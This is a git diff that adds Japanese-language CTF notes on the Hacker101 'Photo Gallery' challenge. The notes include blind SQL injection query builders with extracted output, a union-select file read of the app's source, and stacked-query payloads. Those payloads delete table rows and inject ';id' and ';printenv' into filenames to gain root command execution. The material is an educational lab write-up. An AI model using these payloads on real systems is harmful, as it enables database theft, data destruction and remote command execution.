@@ -92,7 +92,7 @@ CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(64), name VARCHAR(128)
 ```
 
 ## hacker101 CTF
-### (Photo Gallery)
+### Photo Gallery
 `https://ctf.hacker101.com/ctf`  
 以下のページが問題。  
 ![image](https://user-images.githubusercontent.com/56021519/103919476-698e4900-5153-11eb-81ed-604ffc2c9917.png)  
@@ -459,6 +459,157 @@ SELECT table_name from  information_schema.columns where table_schema like 'db44
 
 // 指定したDB、テーブルの持つカラムを結合して1行で表示
 SELECT group_concat(column_name) from  information_schema.columns where table_schema like 'db44364' AND table_name like 'demo'
+```
+```python
+database = "level5"
+table = "photos"
+column1 = "title"
+column2 = "filename"
+column3 = "parent"
+
+def create_length_query(md,times):
+    query = " AND if(length((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3)#"
+    #print(query)
+    return query
+
+def create_2tansaku_query(md,i,times):
+    query = " AND if(ascii(substr((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3)#"
+    #print(query)
+    return query
+```
+このInvisibleがフラグらしい……。（FLAG形式じゃないやないか…（怒））  
+```txt
+[-] exploit finished
+Utterly adorable:files/adorable.jpg:1
+Purrfect:files/purrfect.jpg:1
+Invisible:b92cc0e313bc00b1548c0563c26f15d5c32690694e49707ed32192036b499674:1
+```
+```python
+database = "level5"
+table = "albums"
+column1 = "title"
+
+def create_length_query(md,times):
+    query = " AND if(length((select concat("+column1+") from " + database + "." + table + " limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3)#"
+    #print(query)
+    return query
+
+def create_2tansaku_query(md,i,times):
+    query = " AND if(ascii(substr((select concat("+column1+") from " + database + "." + table + " limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3)#"
+    #print(query)
+    return query
+```
+```txt
+[-] exploit finished
+Kittens
+```
+#### flag0 (Union query)
+ファイル名をSQLでidから取り出していることが考えられるので、`0 union select '../../main.py'`として有効なファイル名を強引に渡せばよいらしい！  
+`0 union select 1`でInternal Server Errorとなっていたのは、ファイル名として1が取り出され、それをpythonでreadしようとしてerrorが発生したからである。  
+ヒントから`uwsgi-nginx-flask-docker`を使っているとわかり、main.pyを使っていることとそのパスを推測できるらしい……  
+https://github.com/tiangolo/uwsgi-nginx-flask-docker  
+```txt
+from flask import Flask, abort, redirect, request, Response import base64, json, MySQLdb, os, re, subprocess app = Flask(__name__) home = '''
+Magical Image Gallery
+$ALBUMS$ ''' viewAlbum = '''
+$TITLE$
+$GALLERY$ ''' def getDb(): return MySQLdb.connect(host="localhost", user="root", password="", db="level5") def sanitize(data): return data.replace('&', '&').replace('<', '<').replace('>', '>').replace('"', '"') @app.route('/') def index(): cur = getDb().cursor() cur.execute('SELECT id, title FROM albums') albums = list(cur.fetchall()) rep = '' for id, title in albums: rep += '
+%s
+\n' % sanitize(title) rep += '
+' cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, )) fns = [] for pid, ptitle, pfn in cur.fetchall(): rep += '
+
+%s
+' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '' rep += '
+\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404) # It's dangerous to go alone, take this: # ^FLAG^59540711ea6225ea8310897c6baa3a11b287c7e8dcad02a1bb2b3275666ec6b5$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == "__main__": app.run(host='0.0.0.0', port=80)
+```
+### flag1 (blind Injection)
+```python
+database = "level5"
+table = "photos"
+column1 = "title"
+column2 = "filename"
+column3 = "parent"
+
+def create_length_query(md,times):
+    query = " AND if(length((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3)#"
+    #print(query)
+    return query
+
+def create_2tansaku_query(md,i,times):
+    query = " AND if(ascii(substr((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3)#"
+    #print(query)
+    return query
+```
+このInvisibleがフラグらしい……。（FLAG形式じゃないやないか…（怒））  
+```txt
+[-] exploit finished
+Utterly adorable:files/adorable.jpg:1
+Purrfect:files/purrfect.jpg:1
+Invisible:b92cc0e313bc00b1548c0563c26f15d5c32690694e49707ed32192036b499674:1
+```
+### flag2 (Stack query / OS Command Injection)
+`printenv`で環境変数を見ればいいらしい。  
+flag0でゲットしたソースは以下の通り。`subprocess.check_output('du -ch %s `でphotosテーブルのfilenameの名前を`du`コマンドに結合しており、OS Command Injectionが可能である！  
+ここには外部からの入力を入れる場所はないが、今は任意のSQLを実行できる状態なので、Stack Query型で任意のfilenameの名前にすればInject可能！  
+`DELETE from photos;commit;`でphotosテーブルを削除する。`commit`でトランザクションを完了しないと、DELETEしたことにならないので必ず`commit`をつけないとダメ！  
+`INSERT INTO photos (title, filename,parent) VALUES (';id', ';id',1); commit;`で任意の名前のデータを挿入する。`id`カラムは勝手についてくれるので残りの`title`,`filename`,`parent`を指定する。  
+
+```python
+@app.route('/')
+def index():
+    cur = getDb().cursor()
+    cur.execute('SELECT id, title FROM albums')
+    albums = list(cur.fetchall())
+    rep = ''
+    for id, title in albums:
+        rep += '<h2>%s</h2>\n' % sanitize(title)
+        rep += '<div>'
+        cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
+        fns = []
+        for pid, ptitle, pfn in cur.fetchall():
+            rep += '<div><img src="fetch?id=%i" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
+            fns.append(pfn)
+        rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
+        rep += '</div>\n'
+    return home.replace('$ALBUMS$', rep)
+@app.route('/fetch')
+def fetch():
+    cur = getDb().cursor()
+    if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
+        abort(404)
+    # It's dangerous to go alone, take this:
+    # ^FLAG^hehehehe$FLAG$
+    return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=80)
+```
+`0;DELETE from photos;commit;`でテーブル内を削除した後、  
+`0;INSERT INTO photos (title, filename,parent) VALUES (';id', ';id',1); commit;`で`id`コマンドを実行するようにしてみると、以下のようにidコマンドが実行できた！  
+```txt
+;id
+Space used: uid=0(root) gid=0(root) groups=0(root)
+```
+`0;DELETE from photos;commit;INSERT INTO photos (title, filename,parent) VALUES (';echo$(printenv)', ';echo$(printenv)',1); commit;`をすると、以下のように2行目以降が見えない……  
+```txt
+Space used: /bin/sh: 1: echoPYTHONIOENCODING=UTF-8: not found
+```
+`;echo$(printenv)| tr -d "\n"`で1行にまとめられると思ったけど、`.strip().rsplit('\n', 1)[-1]`で改行を区切り文字として最後の要素を取り出すのでこの場合は`"`が取り出されてしまう。  
+`0;DELETE from photos;commit;INSERT INTO photos (title, filename,parent) VALUES (';printenv>files/output1', ';printenv>files/output1',1); commit;`としてファイルに結果を書きこんでからそれを表示すれば解決した。  
+`0 union select 'files/output1'`  
+```txt
+PYTHONIOENCODING=UTF-8 UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi 
+SUPERVISOR_GROUP_NAME=uwsgi FLAGS=
+["^FLAG^59540711ea6225ea8310897c6baa3a11b287c7e8dcad02a1bb2b3275666ec6b5$FLAG$", 
+"^FLAG^b92cc0e313bc00b1548c0563c26f15d5c32690694e49707ed32192036b499674$FLAG$", 
+"^FLAG^aa435df54317de31f5da65f7fd430f78ebcdc51825f124624b232cf00b367efe$FLAG$"] 
+HOSTNAME=0afaf3213fe1 SHLVL=0 PYTHON_PIP_VERSION=18.1 HOME=/root 
+GPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF UWSGI_INI=/app/uwsgi.ini NGINX_MAX_UPLOAD=0 
+UWSGI_PROCESSES=16 STATIC_URL=/static UWSGI_CHEAPER=2 NGINX_VERSION=1.13.12-1~stretch 
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
+NJS_VERSION=1.13.12.0.2.0-1~stretch LANG=C.UTF-8 SUPERVISOR_ENABLED=1 PYTHON_VERSION=2.7.15 
+NGINX_WORKER_PROCESSES=1 SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock 
+SUPERVISOR_PROCESS_NAME=uwsgi LISTEN_PORT=80 STATIC_INDEX=0 PWD=/app STATIC_PATH=/app/static 
+PYTHONPATH=/app UWSGI_RELOADS=0
 ```
 # メモ
 https://www.hamayanhamayan.com/entry/2020/06/25/222618  
